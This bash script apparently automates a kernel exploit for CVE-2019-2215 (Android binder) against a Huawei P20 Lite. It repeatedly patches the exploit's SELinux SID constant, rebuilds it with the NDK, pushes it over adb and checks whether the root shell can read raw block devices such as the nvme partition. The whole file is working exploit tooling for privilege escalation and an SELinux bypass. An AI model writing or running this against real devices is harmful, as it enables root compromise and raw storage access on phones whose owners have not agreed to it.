#!/bin/bash
# Fallback: if SID 1 does not grant access, sweep other initial SIDs.
# Initial SID table: 1=kernel, 2=security, 3=unlabeled, 4=fs, 5=file,
# 6=file_labels, 7=init, 8=any_socket. kernel and init are the permissive ones.
set -u
cd /home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)

for S in 1 7 3 2; do
  echo "############ SID=$S"
  python3 - "$S" <<'PY'
import re,sys
s=sys.argv[1]
p='/home/placeless/dev/p20lite-cve/exploit/include/kernel_specific.h'
t=open(p).read()
t=re.sub(r'#define KERNEL_DOMAIN_SID \d+ul', f'#define KERNEL_DOMAIN_SID {s}ul', t)
open(p,'w').write(t)
PY
  grep -n "define KERNEL_DOMAIN_SID" exploit/include/kernel_specific.h

  ${NDK}ndk-build -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
      APP_PLATFORM=android-28 APP_ABI=arm64-v8a >/dev/null 2>&1
  [ -f libs/arm64-v8a/cve-2019-2215 ] || { echo "  build failed"; continue; }
  timeout 60 adb push libs/arm64-v8a/cve-2019-2215 /data/local/tmp/cve-2019-2215 2>&1 | tail -1
  timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215'

  # the test: can we open a block device (the thing the shell domain cannot do)?
  printf 'id\ncat /proc/self/attr/current\nblockdev --getsize64 /dev/block/bootdevice/by-name/nvme 2>&1\ndd if=/dev/block/bootdevice/by-name/nvme bs=512 count=1 2>&1 | od -c | head -2\n' \
    | timeout 180 adb shell /data/local/tmp/cve-2019-2215 > "/tmp/sid_$S.out" 2>&1

  if grep -q "uid=0(root)" "/tmp/sid_$S.out"; then
    echo "  root OK at SID=$S"
    echo "  --- access result ---"
    grep -nE "forced|context|blockdev|nvme|Permission|denied|^[0-9]" "/tmp/sid_$S.out" | tail -8
    if ! grep -q "Permission denied" "/tmp/sid_$S.out"; then
      echo "  >>>>>> SID=$S GRANTS BLOCK ACCESS <<<<<<"
      echo "$S" > /tmp/winning_sid.txt
      break
    fi
  else
    echo "  no root (last: $(tail -1 /tmp/sid_$S.out | cut -c1-50))"
  fi
done

echo
echo "=== winning SID: $(cat /tmp/winning_sid.txt 2>/dev/null || echo none) ==="
